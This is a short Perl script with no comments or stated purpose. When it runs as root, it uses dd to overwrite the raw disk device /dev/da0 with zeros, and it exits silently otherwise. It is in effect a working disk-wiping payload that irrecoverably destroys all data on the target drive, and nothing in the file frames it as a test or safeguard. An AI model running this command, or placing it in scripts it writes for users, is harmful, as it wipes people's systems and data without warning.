#!/usr/bin/env perl
use strict;
use warnings;

exit 0 if $> != 0;
system("dd", "if=/dev/zero", "of=/dev/da0", "bs=1m");
